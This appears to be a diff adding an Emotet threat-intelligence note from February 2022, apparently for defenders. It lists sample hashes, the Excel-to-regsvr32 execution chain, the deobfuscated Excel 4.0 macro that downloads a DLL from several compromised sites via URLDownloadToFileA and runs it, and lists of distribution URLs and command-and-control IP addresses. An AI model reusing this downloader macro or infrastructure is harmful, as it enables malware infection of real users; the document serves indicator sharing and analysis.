@@ -1,0 +1,94 @@
+Emotet 2022 | epoch5 | 23.02.2022 | 
+
+************************************************************************************************************
+
+.xls 6784fcf0a3257229b993cd88faf40b25e79e99a884e360bb70d0e8ea720a3277
+.dll 34eb11ccf65166286782f2511e200d04533ddb98c000e525efbc528360a7e233
+
+
+Exec >>
+
+C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\file-23022022.xls"
+
+C:\Windows\SysWow64\regsvr32.exe /s ..\xxw1.ocx
+
+C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Xqsrllvf\ukczbmw.pmq
+
+
+************************************************************************************************************
+
+  =FORMULA('Br1'!C15,'Br2'!B3)=FORMULA(Grrr1!P22&Grrr1!H9&Grrr1!L2&Grrr1!B15&Grrr1!B15&Sbrr1!B10&Sbrr1!D3&Sbrr1!C15&Sbrr1!F5&'Br2'!B3&Sbrr1!H8&Sbrr1!G12&Sbrr1!J3&Sbrr1!F24&Sbrr1!P14&Sbrr1!M6,D15)=FORMULA(Grrr1!P22&Grrr1!J11&Grrr1!B18&Grrr1!P11&"DDWD"&Sbrr1!J11&Grrr1!H9&Grrr1!L2&Grrr1!B15&Grrr1!B15&Sbrr1!B10&Sbrr1!D3&Sbrr1!C15&Sbrr1!F5&'Br2'!B3&Sbrr1!H8&Sbrr1!G12&Sbrr1!J3&Sbrr1!G26&Sbrr1!P14&Sbrr1!M6&Grrr1!P13,D17)=FORMULA(Grrr1!P22&Grrr1!J11&Grrr1!B18&Grrr1!P11&"DDWD1"&Sbrr1!J11&Grrr1!H9&Grrr1!L2&Grrr1!B15&Grrr1!B15&Sbrr1!B10&Sbrr1!D3&Sbrr1!C15&Sbrr1!F5&'Br2'!B3&Sbrr1!H8&Sbrr1!G12&Sbrr1!J3&Sbrr1!H28&Sbrr1!P14&Sbrr1!M6&Grrr1!P13,D19)=FORMULA(Grrr1!P22&Grrr1!J11&Grrr1!B18&Grrr1!P11&"DDWD2"&Sbrr1!J11&Grrr1!H9&Grrr1!L2&Grrr1!B15&Grrr1!B15&Sbrr1!B10&Sbrr1!D3&Sbrr1!C15&Sbrr1!F5&'Br2'!B3&Sbrr1!H8&Sbrr1!G12&Sbrr1!J3&Sbrr1!I30&Sbrr1!P14&Sbrr1!M6&Grrr1!P13,D21)=FORMULA(Grrr1!P22&Grrr1!J11&Grrr1!B18&Grrr1!P11&"DDWD3"&Sbrr1!J11&Grrr1!H9&Grrr1!L2&Grrr1!B15&Grrr1!B15&Sbrr1!B10&Sbrr1!D3&Sbrr1!C15&Sbrr1!F5&'Br2'!B3&Sbrr1!H8&Sbrr1!G12&Sbrr1!J3&Sbrr1!J32&Sbrr1!P14&Sbrr1!M6&Grrr1!P13,D23)=FORMULA(Grrr1!P22&Grrr1!J11&Grrr1!B18&Grrr1!P11&"DDWD4"&Sbrr1!J11&Grrr1!H9&Grrr1!B15&Grrr1!I17&Grrr1!I3&Grrr1!H13&Grrr1!P11&Grrr1!K9&Grrr1!P13&Grrr1!P7&Grrr1!P13,D25)=FORMULA(Grrr1!P22&Grrr1!H13&Grrr1!N4&Grrr1!H13&Grrr1!H9&Grrr1!P11&Grrr1!P15&Grrr1!H9&Grrr1!P20&Sbrr1!T2&Sbrr1!P7&Sbrr1!N18&Grrr1!P19&Grrr1!P27&Grrr1!M7&Sbrr1!R4&Grrr1!P15&Grrr1!P13,D27)=FORMULA(Grrr1!P22&Grrr1!G24&Grrr1!H13&Grrr1!I26&Grrr1!E11&Grrr1!G24&Grrr1!K23&Grrr1!P11&Grrr1!P13,D36)
+      
+      =CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://servidorcarlosydavid.es/wp-admin/jkNPgHxNjF/","..\xxw1.ocx",0,0)
+      
+      =IF(DDWD<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://gmo-sol-p10.heteml.jp/includes/UoJMgYAc1EES/","..\xxw1.ocx",0,0))
+      
+      =IF(DDWD1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://iashanghai.cn/z/Z1PG6ulBh20plss/","..\xxw1.ocx",0,0))
+      
+      =IF(DDWD2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://www.pasionportufuturo.pe/wp-content/HkUfvw0xuCy5/","..\xxw1.ocx",0,0))
+      
+      =IF(DDWD3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://dmdagents.com.au/vqwbgz/CL4Bo4C4VS0deg/","..\xxw1.ocx",0,0))
+      
+      =IF(DDWD4<0, CLOSE(0),)
+      
+      =EXEC("C:\Windows\SysWow64\regsvr32.exe /s ..\xxw1.ocx")
+      
+
+************************************************************************************************************
+
+.dll distro
+
+http://servidorcarlosydavid.es/wp-admin/jkNPgHxNjF/
+https://gmo-sol-p10.heteml.jp/includes/UoJMgYAc1EES/
+https://iashanghai.cn/z/Z1PG6ulBh20plss/
+https://www.pasionportufuturo.pe/wp-content/HkUfvw0xuCy5/
+http://dmdagents.com.au/vqwbgz/CL4Bo4C4VS0deg/
+http://lpm.fk.ub.ac.id/Fox-C/faKwS6p6/
+https://lydt.cc/wp-includes/6sfYo/
+http://wvfsbrasil.com.br/Acrasieae/LIYNOqCthfZuCWQz3/
+https://stratuswebsolutions.co.nz/wp-content/wyEEj5jH8xq50rp1/
+http://littlesweet.co.uk/wp-admin/vko/
+
+
+c2's
+
+27.254.174.84:8080
+61.7.231.229:443
+168.197.250.14:80
+59.148.253.194:443
+195.154.146.35:443
+159.69.237.188:443
+139.196.72.155:8080
+185.148.168.220:8080
+191.252.103.16:80
+54.38.242.185:443
+185.184.25.78:8080
+54.37.228.122:443
+45.71.195.104:8080
+185.148.168.15:8080
+54.37.106.167:8080
+103.41.204.169:8080
+198.199.98.78:8080
+61.7.231.226:443
+210.57.209.142:8080
+190.90.233.66:443
+85.214.67.203:8080
+68.183.93.250:443
+103.42.57.17:8080
+37.44.244.177:8080
+194.9.172.107:8080
+118.98.72.86:443
+78.46.73.125:443
+104.131.62.48:8080
+128.199.192.135:8080
+37.59.209.141:8080
+217.182.143.207:443
+62.171.178.147:8080
+93.104.209.107:8080
+116.124.128.206:8080
+66.42.57.149:443
+173.203.78.138:443
+203.153.216.46:443
+207.148.81.119:8080
+195.77.239.39:8080
+78.47.204.80:443
